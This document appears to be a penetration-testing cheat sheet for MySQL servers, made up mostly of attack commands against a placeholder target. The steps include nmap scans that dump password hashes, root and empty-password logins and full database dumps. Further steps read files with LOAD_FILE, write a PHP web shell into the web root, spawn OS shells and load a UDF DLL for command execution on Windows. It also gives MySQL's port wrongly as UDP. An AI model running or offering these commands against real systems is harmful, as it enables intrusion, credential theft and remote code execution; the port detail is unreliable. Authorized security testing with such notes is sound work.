# MYSQL 

MYSQL default port: `3306/udp`

> nmap Vuln scan

    nmap -sV -Pn -vv  TARGET_IP -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122

> MYSQL Version

    use auxiliary/scanner/mysql/mysql_version

> Mysql client 

    mysql -h TARGET_IP
    mysql -h TARGET_IP -u root
    mysql -h TARGET_IP -u root@localhost
    mysql -h TARGET_IP -u ""@localhost
    mysql -h TARGET_IP -e "QUERY"
    mysql -h TARGET_IP -u root -pPASSWORD -e "QUERY"
> To run many sql commands at once

    mysql -u username -p < manycommands.sql
> Command History

    cat ~/.mysql.history

> Dump DB

    mysqldump -u USERNAME -p PASSWORD --all-databases --skip-lock-tables

### Querys
> Enum 

```SQL
select version();
select user();
select database();
show databases;
SHOW TABLES;
SHOW TABLES FROM DATABASE_NAME;
```

> DB user Info 
```SQL
SELECT user,password, file_priv FROM mysql.user;
```
> DB user Info 
```SQL
select host, user, authentication_string from mysql.user;
```

> Create a new user and grant him privileges

```SQL
mysql> create user test identified by 'test';
mysql> grant SELECT,CREATE,DROP,UPDATE,DELETE,INSERT on *.* to mysql identified by 'mysql' WITH GRANT OPTION;
```

> Enum 

 	show databases;

## Interact with OS 


### Read file 
 
```SQL
SELECT LOAD_FILE('FILENAME');
```

> Read file BASE64

This is useful to read a php file while doing sqli

```SQL
SELECT BASE64(LOAD_FILE('FILENAME'));
```

### Write file 

```SQL
SELECT "<?php echo system($_GET['cmd']);?>" into OUTFILE '/var/www/html/shell.php'
```

## Remote Code Exectution (Windows)
### Linux

    mysql> \! cat /etc/passwd
    mysql> \! bash

### Windows
> Doc

https://www.exploit-db.com/docs/english/44139-mysql-udf-exploitation.pdf?rss


> DLL to upload 

    /opt/metasploit/data/exploits/mysql/lib_mysqludf_sys_32.dll
    /opt/metasploit/data/exploits/mysql/lib_mysqludf_sys_64.dll

> Info
> 
```SQL
select@@version_compile_os, @@version_compile_machine;
show variables like'%compile%'
select @@plugin_dir
show variables like'plugin%';
```

> Exploit 
> 
```SQL
create function sys_eval returns string soname 'udf.dll'
select * from mysql.func where name = 'sys_eval'
select sys_eval('whoami')
```
